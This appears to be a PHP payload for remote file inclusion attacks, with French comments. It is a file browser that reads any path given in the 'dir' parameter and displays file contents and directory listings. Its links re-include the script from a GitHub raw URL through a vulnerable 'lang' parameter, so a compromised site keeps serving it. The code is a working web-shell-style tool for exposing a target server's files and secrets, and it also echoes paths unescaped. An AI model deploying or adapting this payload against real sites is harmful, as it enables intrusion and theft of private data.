<?php
$path = isset($_GET['dir']) ? $_GET['dir'] : '.';

if (is_file($path)) {
    echo "<h3>Contenu de : $path</h3><pre>";
    // Affiche le code source proprement
    echo htmlspecialchars(file_get_contents($path));
    echo "</pre>";
    exit;
}

echo "<h3>Contenu du répertoire : $path</h3><ul>";
foreach (scandir($path) as $file) {
    $full = $path . '/' . $file;
    echo "<li><a href='?lang=https://raw.githubusercontent.com/Vivien-Chambe/scripts/main/rfi&dir=$full'>$file</a></li>";
}
echo "</ul>";
?>

